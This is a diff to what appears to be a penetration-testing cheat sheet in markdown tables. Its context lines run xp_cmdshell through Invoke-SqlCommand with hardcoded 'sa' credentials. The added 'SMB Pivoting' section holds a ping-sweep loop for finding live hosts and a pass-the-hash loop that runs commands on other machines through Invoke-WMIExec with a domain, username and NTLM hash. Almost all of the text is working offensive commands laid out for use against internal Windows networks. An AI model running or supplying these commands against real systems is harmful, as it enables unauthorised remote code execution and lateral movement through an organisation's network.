@@ -180,9 +180,14 @@
 |Invoke-SqlCommand -server  192.168.1.10  -username sa -password 123456qQ -database master -query "exec xp_cmdshell 'systeminfo' "|
 |Invoke-SqlCommand -server  192.168.1.10  -username sa -password 123456qQ -database master -query "exec xp_cmdshell 'net users' " |
 
-| Linxu and Microsoft RPC Enumeration  |
+
+### SMB Pivoting
+| SMB Pivoting |
 | ------------- |
-|RE|
+|for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.3.%i >> results.txt|
+|Get-Content .\results.txt | Select-String -Pattern "Received = 1" -Context 1,0|
+|$target = @("-start 192.168.8.2 -end 192.168.8.20")|
+|foreach ($h in $target) { Invoke-WMIExec -Target $h -Domain ninja.corp -Username MeMe -Hash a787ee0125065789ab0f3091d3cf6786 -Command "hostname" -verbose }|
 
 
 
